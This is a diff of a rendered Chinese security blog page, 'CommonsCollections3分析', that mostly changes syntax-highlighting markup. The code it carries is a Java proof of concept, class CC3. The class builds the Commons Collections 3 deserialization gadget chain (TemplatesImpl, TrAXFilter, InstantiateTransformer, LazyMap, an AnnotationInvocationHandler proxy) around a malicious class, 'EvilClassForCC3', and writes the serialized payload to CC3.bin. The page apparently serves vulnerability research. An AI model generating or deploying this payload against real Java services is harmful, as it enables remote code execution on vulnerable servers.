@@ -211,7 +211,7 @@
     <h1 class="post-title">
       CommonsCollections3分析
     </h1>
-    <div class="post-meta"><span title='2022-10-27 16:05:33 +0800 +0800'>2022-10-27</span>&nbsp;·&nbsp;4 分钟&nbsp;·&nbsp;Reus09
+    <div class="post-meta">&lt;span title=&#39;2022-10-27 16:05:33 &#43;0800 &#43;0800&#39;&gt;2022-10-27&lt;/span&gt;&amp;nbsp;·&amp;nbsp;4 分钟&amp;nbsp;·&amp;nbsp;Reus09
 
 </div>
   </header> <aside id="toc-container" class="toc-container wide">
@@ -377,53 +377,53 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC3</span> <span style="color:#f92672">{</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC3</span> {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CC3.bin&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String fileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CC3.bin&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> NoSuchFieldException<span style="color:#f92672">,</span> IllegalAccessException<span style="color:#f92672">,</span> ClassNotFoundException<span style="color:#f92672">,</span> InvocationTargetException<span style="color:#f92672">,</span> InstantiationException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 读取恶意类 bytes[]
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		InputStream inputStream <span style="color:#f92672">=</span> CC3<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getResourceAsStream</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;EvilClassForCC3.class&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>      bytes       <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>inputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()];</span>
-</span></span><span style="display:flex;"><span>		inputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">(</span>bytes<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 读取恶意类 bytes[]</span>
+</span></span><span style="display:flex;"><span>		InputStream inputStream <span style="color:#f92672">=</span> CC3.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getResourceAsStream</span>(<span style="color:#e6db74">&#34;EvilClassForCC3.class&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>      bytes       <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>inputStream.<span style="color:#a6e22e">available</span>()<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>		inputStream.<span style="color:#a6e22e">read</span>(bytes);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 初始化 TemplatesImpl 对象
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		TemplatesImpl tmpl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl<span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>		Field         bytecodes <span style="color:#f92672">=</span> TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		bytecodes<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		bytecodes<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>tmpl<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]{</span>bytes<span style="color:#f92672">});</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// _name 不能为空
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		Field name <span style="color:#f92672">=</span> TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		name<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		name<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>tmpl<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;reus09&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 初始化 TemplatesImpl 对象</span>
+</span></span><span style="display:flex;"><span>		TemplatesImpl tmpl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>		Field         bytecodes <span style="color:#f92672">=</span> TemplatesImpl.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_bytecodes&#34;</span>);
+</span></span><span style="display:flex;"><span>		bytecodes.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>		bytecodes.<span style="color:#a6e22e">set</span>(tmpl, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{bytes});
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// _name 不能为空</span>
+</span></span><span style="display:flex;"><span>		Field name <span style="color:#f92672">=</span> TemplatesImpl.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;_name&#34;</span>);
+</span></span><span style="display:flex;"><span>		name.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>		name.<span style="color:#a6e22e">set</span>(tmpl, <span style="color:#e6db74">&#34;reus09&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 结合 ChainedTransformer
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		ChainedTransformer chain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{</span>
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>TrAXFilter<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">),</span>
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">new</span> InstantiateTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>Templates<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span>tmpl<span style="color:#f92672">})</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#f92672">});</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 结合 ChainedTransformer</span>
+</span></span><span style="display:flex;"><span>		ChainedTransformer chain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(<span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">new</span> ConstantTransformer(TrAXFilter.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">new</span> InstantiateTransformer(<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Templates.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{tmpl})
+</span></span><span style="display:flex;"><span>		});
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 初始化 LazyMap
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		Map            lazyMap     <span style="color:#f92672">=</span> LazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">decorate</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">(),</span> chain<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		Class<span style="color:#f92672">&lt;?&gt;</span>       c           <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		Constructor<span style="color:#f92672">&lt;?&gt;</span> constructor <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredConstructors</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">];</span>
-</span></span><span style="display:flex;"><span>		constructor<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 初始化 LazyMap</span>
+</span></span><span style="display:flex;"><span>		Map            lazyMap     <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(<span style="color:#66d9ef">new</span> HashMap(), chain);
+</span></span><span style="display:flex;"><span>		Class<span style="color:#f92672">&lt;?&gt;</span>       c           <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
+</span></span><span style="display:flex;"><span>		Constructor<span style="color:#f92672">&lt;?&gt;</span> constructor <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredConstructors</span>()<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>		constructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		InvocationHandler handler <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>InvocationHandler<span style="color:#f92672">)</span> constructor<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>Target<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> lazyMap<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 创建LazyMap的动态代理类实例
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		Map mapProxy <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Map<span style="color:#f92672">)</span> Proxy<span style="color:#f92672">.</span><span style="color:#a6e22e">newProxyInstance</span><span style="color:#f92672">(</span>LazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClassLoader</span><span style="color:#f92672">(),</span> LazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getInterfaces</span><span style="color:#f92672">(),</span> handler<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例</span>
+</span></span><span style="display:flex;"><span>		InvocationHandler handler <span style="color:#f92672">=</span> (InvocationHandler) constructor.<span style="color:#a6e22e">newInstance</span>(Target.<span style="color:#a6e22e">class</span>, lazyMap);
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 创建LazyMap的动态代理类实例</span>
+</span></span><span style="display:flex;"><span>		Map mapProxy <span style="color:#f92672">=</span> (Map) Proxy.<span style="color:#a6e22e">newProxyInstance</span>(LazyMap.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getClassLoader</span>(), LazyMap.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getInterfaces</span>(), handler);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 使用动态代理初始化 AnnotationInvocationHandler
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		InvocationHandler invocationHandler <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>InvocationHandler<span style="color:#f92672">)</span> constructor<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>Target<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> mapProxy<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 使用动态代理初始化 AnnotationInvocationHandler</span>
+</span></span><span style="display:flex;"><span>		InvocationHandler invocationHandler <span style="color:#f92672">=</span> (InvocationHandler) constructor.<span style="color:#a6e22e">newInstance</span>(Target.<span style="color:#a6e22e">class</span>, mapProxy);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		SerializeUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObjectToFile</span><span style="color:#f92672">(</span>invocationHandler<span style="color:#f92672">,</span> fileName<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//		SerializeUtil.readFileObject(fileName);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>		SerializeUtil.<span style="color:#a6e22e">writeObjectToFile</span>(invocationHandler, fileName);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//		SerializeUtil.readFileObject(fileName);</span>
+</span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>攻击结果：</p>
